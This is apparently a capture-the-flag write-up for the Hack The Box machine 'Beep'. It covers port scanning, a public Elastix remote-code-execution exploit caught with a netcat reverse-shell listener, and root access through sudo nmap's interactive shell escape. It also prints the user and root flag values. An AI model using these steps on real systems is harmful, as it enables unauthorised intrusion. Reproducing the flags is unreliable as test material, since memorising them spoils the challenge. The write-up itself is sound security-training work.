# Beep - Easy

```shell
nmap -T4 -p- -A -Pn -v 10.10.10.7

nmap --script vuln 10.10.10.7

sudo vim /etc/ssl/openssl.cnf
#at end of config file
#edit MinProtocol = None and CipherString = None

vim elastix-rce.py
#modify exploit

python elastix-rce.py

nc -nvlp 4444
#setup listener for reverse shell from running exploit
#we get reverse shell

whoami
#asterisk

sudo -l
#we have multiple services that can be run as root without password

sudo /usr/bin/nmap --interactive

#in nmap prompt
!sh
#we have root shell
```

* Open ports & services:

  * 22 - ssh - OpenSSH 4.3 (protocol 2.0)
  * 25 - smtp - Postfix smtpd
  * 80 - http - Apache httpd 2.2.3
  * 110 - pop3 - Cyrus pop3d
  * 111 - rpcbind
  * 143 - imap - Cyrus imapd
  * 443 - ssl/http - Apache httpd 2.2.3
  * 993 - ssl/imap - Cyrus imapd
  * 995 - pop3 - Cyrus pop3d
  * 3306 - mysql - mysql
  * 4190 - sieve - Cyrus timsieved
  * 4559 - HylaFAX 4.3.10
  * 5038 - asterisk - Asterisk Call Manager 1.1
  * 10000 - http - Miniserv 1.570 (Webmin httpd)

* We can begin enumerating the services one-by-one.

* We are unable to access the webpages using SSL due to an unsupported version error - this can be resolved by modifying the browser settings to accept older SSL cert versions.

* Now, accessing <https://10.10.10.7>, we encounter a login page for ```Elastix```.

* The same webpage is hosted on port 443 as well; we can enumerate other ports with similar services.

* Checking <https://10.10.10.7:10000>, we have a Webmin login page.

* Now, we are unable to fuzz these webpages, so we will have to lower our SSL security level by modifying configuration as well.

* In the openssl config file, we have to edit both MinProtocol and CipherString values to None.

* Now, Googling for exploits related to Elastix gives us a Python script.

* Modifying & running this script allows us to get a reverse shell at out listener; we get shell as 'asterisk'.

* Now, using ```sudo -l```, we can see that there are multiple paths to become root - we can choose any service from the list and run as root.

* Getting the exploit from GTFObins for 'nmap' in this instance, we can run the commands and get root shell.

```markdown
1. User flag - a075b54365b5e47329554cc18878f1d4

2. Root flag - 08afd44761440352b3db6f139c318dba
```
